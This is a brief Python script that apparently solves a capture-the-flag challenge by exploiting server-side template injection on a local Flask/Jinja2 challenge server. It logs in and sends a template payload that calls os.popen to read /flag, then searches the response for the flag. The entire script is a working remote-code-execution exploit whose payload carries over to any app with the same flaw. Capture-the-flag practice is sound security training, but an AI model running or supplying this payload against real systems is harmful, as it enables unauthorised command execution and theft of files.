import requests
import re

s = requests.Session()
s.post("http://challenge.local:8080/login", data={"username": "test", "password": "test"})

payload = "{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}"
r = s.get("http://challenge.local:8080/search", params={"q": payload}, stream=True)

# Read response in chunks and search for FLAG
flag_found = False
for chunk in r.iter_content(chunk_size=1024, decode_unicode=True):
    if chunk:
        m = re.search(r'FLAG\{[^}]+\}', str(chunk))
        if m:
            print(f"FLAG: {m.group(0)}")
            flag_found = True
            break

if not flag_found:
    print("No FLAG pattern found in response")

